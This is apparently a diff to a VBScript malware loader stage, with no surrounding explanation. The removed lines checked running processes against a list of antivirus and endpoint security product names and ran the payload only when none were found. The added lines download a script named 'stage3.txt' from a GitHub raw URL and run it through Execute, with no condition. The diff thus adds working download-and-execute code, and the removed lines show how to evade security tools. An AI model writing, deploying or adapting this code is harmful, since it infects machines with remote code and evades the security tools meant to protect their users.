@@ -1,33 +1,10 @@
 Dim fso, sh, http, code
-Dim wmi, procs, p, avList, re, isAV
 
-isAV = False
+Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+http.Open "GET", "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/stage3.txt", False
+http.Send
 
-' --- AV Process Scan ---
-On Error Resume Next
-Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-If Err.Number = 0 Then
-    Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
-    avList = "avp|avgnt|avguard|ekrn|bdagent|ccSvcHst|mbamservice|NortonSecurity|V3Svc|SAVService|McAfeeFramework|MsMpEng|avast|avgsvc|Sophos|SentinelOne|Cylance|CrowdStrike|CSFalcon|Panda|BullGuard|ESET"
-    Set re = New RegExp
-    re.Pattern = avList
-    re.IgnoreCase = True
-    For Each p In procs
-        If re.Test(p.Name) Then
-            isAV = True
-        End If
-    Next
-End If
-Err.Clear
-On Error GoTo 0
-
-' --- Fetch and Execute Stage3 ---
-If Not isAV Then
-    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-    http.Open "GET", "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/stage3.txt", False
-    http.Send
-    If http.Status = 200 Then
-        code = http.ResponseText
-        If Len(code) > 0 Then Execute code
-    End If
+If http.Status = 200 Then
+    code = http.ResponseText
+    If Len(code) > 0 Then Execute code
 End If
